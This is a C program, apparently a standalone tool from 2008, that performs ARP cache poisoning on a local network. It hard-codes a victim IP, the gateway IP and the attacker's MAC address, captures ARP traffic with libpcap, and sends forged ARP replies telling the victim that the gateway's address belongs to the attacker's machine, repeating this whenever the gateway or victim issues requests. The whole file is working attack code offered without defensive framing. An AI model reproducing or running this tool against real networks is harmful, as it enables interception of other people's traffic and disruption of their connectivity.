/* linhanjie 2008-9-19*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_arp.h>
#include <netdb.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <pcap.h>
 
int sockfd; //AF_PACKET type socket

struct sockaddr_ll peer_addr; //AF_PACKET type socket address

unsigned char my_ip[4] = {192, 168, 1, 108}; //my ip address

unsigned char gateway_ip[4] = {192, 168, 1, 1}; //gateway ip address

unsigned char attack_ip[4] = {192, 168, 1, 100}; //ip address to be attacked

unsigned char my_mac[6] = {0x08, 0x00, 0x27, 0xdc, 0xc3, 0xa7 }; //my mac address

 
 
 
//frame header 14 bytes

struct frame_hdr {
        unsigned char dst_mac[6];
        unsigned char src_mac[6];
        unsigned short frm_type;
};
//all frame 14+8+20 bytes

struct frame_ether {
        struct frame_hdr fh;
        struct arphdr ah;
        unsigned char src_mac[6];
        unsigned char src_ip[4];
        unsigned char dst_mac[6];
        unsigned char dst_ip[4];
};
 
 
//send arp request to attack_ip

void send_arp(const unsigned char* attack_ip) {
 
        unsigned char broad_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
        //build arp frame

        struct frame_ether frame;
        memcpy(frame.fh.dst_mac, broad_mac, 6);
        memcpy(frame.fh.src_mac, my_mac, 6);
        frame.fh.frm_type = htons(ETH_P_ARP);
        frame.ah.ar_hrd = htons(ARPHRD_ETHER);
        frame.ah.ar_pro = htons(ETH_P_IP);
        frame.ah.ar_hln = 6;
        frame.ah.ar_pln = 4;
        frame.ah.ar_op = htons(ARPOP_REQUEST);
        memcpy(frame.src_mac, my_mac, 6);
        memcpy(frame.src_ip, my_ip, 4);
        memcpy(frame.dst_mac, broad_mac, 6);
        memcpy(frame.dst_ip, attack_ip, 4);
 
        sendto(sockfd, &frame, sizeof(frame), 0, (struct sockaddr*)&peer_addr, sizeof(peer_addr));
        printf("success send arp request to 192.168.1.%d\n", attack_ip[3]);
}
 
 
//pcap callback function

void callback(unsigned char *args, const struct pcap_pkthdr *head, const unsigned char *packet) {
        printf("------------------------------------------------------------------------------\n");
        struct frame_ether *old_frame= (struct frame_ether*)packet;
        struct frame_ether frame;
        memcpy(&frame, packet, sizeof(frame));
        int ar_op = ntohs(frame.ah.ar_op);
 
// ------------------------------------arp frame info-------------------------------------------------------

        if(ar_op == 1)printf("arp request\t");
        if(ar_op == 2)printf("arp reply \t");
        char ip_buf[128];
        inet_ntop(AF_INET, &old_frame->src_ip, ip_buf, sizeof(ip_buf));
        printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", old_frame->src_mac[0],old_frame->src_mac[1],old_frame->src_mac[2],
                old_frame->src_mac[3],old_frame->src_mac[4],old_frame->src_mac[5], ip_buf);
        printf("\t->\t");
        memset(ip_buf, 0, sizeof(ip_buf));
        inet_ntop(AF_INET, &old_frame->dst_ip, ip_buf, sizeof(ip_buf));
        printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", old_frame->dst_mac[0],old_frame->dst_mac[1],old_frame->dst_mac[2],old_frame->dst_mac[3],old_frame->dst_mac[4],old_frame->dst_mac[5], ip_buf);
        printf("\n");
// ---------------------------------------------------------------------------------------------

 
        if(ar_op == ARPOP_REPLY && (old_frame->src_ip)[3] == attack_ip[3] && (old_frame->dst_ip)[3] == my_ip[3]) { //normal arp reply from attack_ip

                //bulid faked arp reply frame

                memcpy(frame.fh.dst_mac, old_frame->fh.src_mac, 6);
                memcpy(frame.fh.src_mac, my_mac, 6);
                frame.ah.ar_op = htons(ARPOP_REPLY);
                memcpy(frame.dst_mac, old_frame->src_mac, 6);
                memcpy(frame.dst_ip, attack_ip, 4);
                memcpy(frame.src_mac, my_mac, 6);
                memcpy(frame.src_ip, gateway_ip, 4);
                //send faked arp reply frame

                sendto(sockfd, &frame, sizeof(frame), 0, (struct sockaddr*)&peer_addr, sizeof(peer_addr));
                printf("success faked 192.168.1.%d \n", (old_frame->src_ip)[3]);
 
        }
        
        if((ar_op == ARPOP_REQUEST && (old_frame->src_ip)[3] == gateway_ip[3]) ||
           (ar_op == ARPOP_REQUEST && (old_frame->src_ip)[3] == attack_ip[3] && (old_frame->dst_ip)[3] == gateway_ip[3]))
        {

                sleep(1);
                send_arp(attack_ip);
        }
}
 
 
//thread listen arp

void *arp_listen(void *arg) {
        char errbuf[1024];
        char *dev= "eth10";
        pcap_t *handle = pcap_open_live(dev, 2048, 1, 1000, errbuf);
        if(handle == NULL)printf("pcap_open_live():%s\n", errbuf);
        unsigned int net,mask;
        if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)printf("pcap_lookupnet():%s\n", errbuf);
        struct bpf_program fp;
        if(pcap_compile(handle, &fp, "arp", 0, net) == -1)printf("pcap_compile():%s\n", errbuf);
        if(pcap_setfilter(handle, &fp) == -1)printf("pcap_setfilter():%s\n", errbuf);
        while(pcap_loop(handle, -1, callback, NULL) != -1);
        return NULL;
}
 
 
int main(int argc, char **argv) {
 
        pthread_t tid;
        pthread_create(&tid, NULL, arp_listen, NULL);
 
        sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if(sockfd == -1)perror("socket()");
 
        memset(&peer_addr, 0, sizeof(peer_addr));
        peer_addr.sll_family = AF_PACKET;
        struct ifreq req;
        strcpy(req.ifr_name, "eth10");
        if(ioctl(sockfd, SIOCGIFINDEX, &req) != 0)perror("ioctl()");
        peer_addr.sll_ifindex = req.ifr_ifindex;
        peer_addr.sll_protocol = htons(ETH_P_ARP);
 
        send_arp(attack_ip);
 
        pthread_exit(NULL);
        return 0;
}
